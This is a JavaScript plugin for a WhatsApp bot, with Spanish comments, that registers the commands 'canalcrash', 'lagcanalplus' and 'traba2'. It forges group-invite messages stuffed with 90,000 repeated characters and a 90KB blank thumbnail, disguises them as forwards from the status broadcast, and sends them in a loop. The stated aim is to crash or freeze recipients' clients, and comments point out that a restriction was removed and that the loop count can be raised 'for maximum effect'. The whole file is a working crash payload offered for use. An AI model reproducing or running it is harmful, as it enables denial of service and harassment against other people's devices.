let handler = async (m, { conn }) => {
  // 🔴 Se eliminó la restricción de número del bot

  const inviteCode = 'CHANNEL-XPL0IT-' + '𓂀'.repeat(90000);
  const groupName = '🔥 Canal Oficial ⚠️' + '꧁'.repeat(90000);
  const channelJid = '120363999999999999@g.us'; // Puedes modificar por otro canal real
  const thumbnailFake = Buffer.alloc(90000);

  const fakeInviteContent = {
    groupJid: channelJid,
    inviteCode,
    groupName,
    jpegThumbnail: thumbnailFake
  };

  const wrappedViewOnce = {
    viewOnceMessage: {
      message: {
        groupInviteMessage: fakeInviteContent
      }
    }
  };

  const wrappedEphemeral = {
    ephemeralMessage: {
      message: {
        groupInviteMessage: fakeInviteContent
      }
    }
  };

  // Puedes ajustar cuántas veces se envía aquí
  for (let i = 0; i < 5; i++) { // Cambia 5 por 200 para máximo efecto
    await conn.relayMessage(
      m.chat,
      {
        forward: {
          key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
          },
          message: wrappedViewOnce
        }
      },
      { messageId: generateMessageID() }
    );

    await conn.relayMessage(
      m.chat,
      {
        forward: {
          key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
          },
          message: wrappedEphemeral
        }
      },
      { messageId: generateMessageID() }
    );
  }

  m.reply('✅ *Traba canal enviada correctamente.*');
};

handler.command = ["lagcanalplus", "canalcrash", "traba2"];
export default handler;

function generateMessageID() {
  return Math.random().toString(36).substring(2, 15);
}